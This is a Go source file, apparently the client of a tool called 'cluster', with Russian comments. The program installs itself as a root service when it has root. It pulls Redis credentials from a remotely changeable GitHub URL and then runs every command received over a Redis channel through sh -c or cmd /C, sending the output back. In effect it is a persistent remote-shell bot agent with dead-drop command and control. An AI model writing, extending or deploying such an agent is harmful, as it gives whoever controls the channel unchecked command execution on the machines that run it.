package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"cluster/internal/config"
	"cluster/internal/redisclient"
	"cluster/internal/remote"
)

func main() {
	ctx := context.Background()

	// загрузка конфигурации
	cfg, err := config.LoadOrCreate()
	if err != nil {
		log.Fatalf("CRITICAL: Config error: %v", err)
	}

	// root и установка сервиса
	isRoot := config.CheckRoot()
	cfg.IsRoot = isRoot
	config.SaveConfig(cfg)

	if isRoot {
		if err := config.InstallRootService(); err != nil {
			log.Printf("ERROR: Service installation failed: %v", err)
		}
	}

	// обнов конф с гита(а может и не с гита)
	remoteCfg, err := remote.FetchRedisConfig(cfg.GithubURL)
	if err == nil {
		cfg.RedisAddr = remoteCfg.Addr
		cfg.RedisPass = remoteCfg.Password
		config.SaveConfig(cfg)
	} else {
		// лог только если не удалось связаться и в конфиге пусто
		if cfg.RedisAddr == "" {
			log.Printf("ERROR: GitHub unreachable and no local Redis config: %v", err)
		}
	}

	if cfg.RedisAddr == "" {
		log.Fatal("CRITICAL: No Redis address available")
	}

	// редис клиент
	client := redisclient.NewClient(ctx, cfg.RedisAddr, cfg.RedisPass, cfg.DeviceID, cfg.Hostname, isRoot)
	client.UpdateState("Online")

	// Heartbeat
	hbDuration, err := time.ParseDuration(config.HeartbeatInterval)
	if err != nil {
		log.Printf("ERROR: Invalid heartbeat interval '%s', using 30s: %v", config.HeartbeatInterval, err)
		hbDuration = 30 * time.Second
	}

	go func() {
		ticker := time.NewTicker(hbDuration)
		for range ticker.C {
			client.UpdateState("Online")
		}
	}()

	// обработка команд
	go func() {
		for {
			ch, err := client.SubscribeCommands()
			if err != nil {
				log.Printf("REDIS ERROR: Subscription failed: %v. Retrying in 5s...", err)
				time.Sleep(5 * time.Second)
				continue
			}

			for msg := range ch {
				payload := msg.Payload

				// обновления линка на json с кредами
				if strings.HasPrefix(payload, "SET_GITHUB_URL:") {
					newURL := strings.TrimPrefix(payload, "SET_GITHUB_URL:")
					cfg.GithubURL = newURL
					config.SaveConfig(cfg)
					client.PublishResult("[v] GitHub URL updated to: " + newURL)
					continue
				}

				// выполнение и отправка результата
				result := executeCommand(payload)
				client.PublishResult(result)
			}

			// если цикл по ch прервался значит связь разорвана
			time.Sleep(2 * time.Second)
		}
	}()

	// выход
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	<-sigChan
	client.UpdateState("Offline")
}

func executeCommand(command string) string {
	var cmd *exec.Cmd
	// TODO Будет потом функционал, но сейчас не будет.
	if os.Getenv("OS") == "Windows_NT" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(out))
	}
	return string(out)
}
